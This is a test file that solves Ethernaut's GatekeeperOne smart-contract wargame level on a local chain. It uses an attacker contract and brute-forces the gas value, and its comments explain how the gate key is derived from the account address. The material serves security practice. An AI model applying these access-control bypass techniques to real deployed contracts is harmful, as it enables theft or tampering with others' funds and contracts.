const GatekeeperOneFactory = artifacts.require('./levels/GatekeeperOneFactory.sol')
const GatekeeperOne = artifacts.require('./levels/GatekeeperOne.sol')
const GatekeeperOneAttacker = artifacts.require('./attacks/N13GatekeeperOneAttacker.sol')
const utils = require('../utils/TestUtils')
const { expect } = require("chai")
const chai = require("chai")
const { solidity } = require("ethereum-waffle")
chai.use(solidity)


describe("Challenge 13 - GatekeeperOne", function () {
    let ethernaut
    let level
    let instance
    let attacker

    async function createLevelInstance() {
        const [_attacker] = await web3.eth.getAccounts()
        attacker = _attacker

        ethernaut = await utils.getEthernautWithStatsProxy()
        level = await GatekeeperOneFactory.new()

        await ethernaut.registerLevel(level.address)

        instance = await utils.createLevelInstance(
            ethernaut,
            level.address,
            attacker,
            GatekeeperOne,
        )
    }

    before(createLevelInstance)

    describe("Initial State", function () {
        it("entrand address is the zero address", async function () {
            expect(await instance.entrant()).to.eq("0x0000000000000000000000000000000000000000")
        })
    })

    describe("Attack Execution", function () {
        /*
            We have to solve three challenges in one to solve this level.

            Gate one: Unlock the gate with a different address than a tx.origin
                
                Solution: We will run our attack from a (malicious) contract. That way,
                tx.origin and msg.sender will be different
            
            Gate two: When opening this gate, we have to have a specific amount of gas
                left in our transaction. Specifically, the gas left mod 8191 has to be zero.
                
                Solution: Since (in my case) these tests are being ran on a local blockchain,
                I will send in 8191 transactions increasing gas by one each time. I will note
                for the first one that has gas used mod 8191 to equal zero.

            Gate three: We have to find a value that has some specific properties when
            converted to and from lower and higher types. Specifics below
            Part1: require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
            Part2: require(uint32(uint64(_gateKey)) != uint64(_gateKey));
            Part3: require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)));

                Solution: Take our EOA and start from part 3 and work our way to part 1
                EOA: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
                Part 3: uint16 of our EOA equals 0x2266. uint32 of that is 0x00002266
                Part 2: uint64 cannot be 0x0000000000002266, so let's chose 0x1000000000002266
                part 1: already satisfied from part 3 above
                final key: 0x1000000000002266            
        */
        it("open all gates", async function () {
            const numOfLoops = 8191
            const maliciousContract = await GatekeeperOneAttacker.new(instance.address)
            const initialGas = 100000 //opened with gas: 101408
            const key = "0x1000000000002266"

            //await maliciousContract.openAllGates({gas:initialGas})
            for (let i = 0; i <= numOfLoops; i++) {
                const options = { gas: initialGas + i }

                try {
                    const isOpened = await maliciousContract.openAllGates(key, options)
                    if (isOpened) {
                        //console.log(`opened with gas: ${initialGas + i}`)
                        break
                    }                    
                } catch (err) {
                    if (err.toString().indexOf("GatekeeperOne") === -1) {
                        //process.stdout.write(`${i}`)
                    } else {
                        //process.stdout.write(`${err} `)
                    }
                }
            }

            expect(await instance.entrant()).to.eq(attacker)
        })
    })

    describe("Ethernaut Validation", function () {
        it("level successfully validated by Ethernaut", async function () {
            const result = await utils.submitLevelInstance(
                ethernaut,
                level.address,
                instance.address,
                attacker
            )

            expect(result).to.be.true
        })
    })
})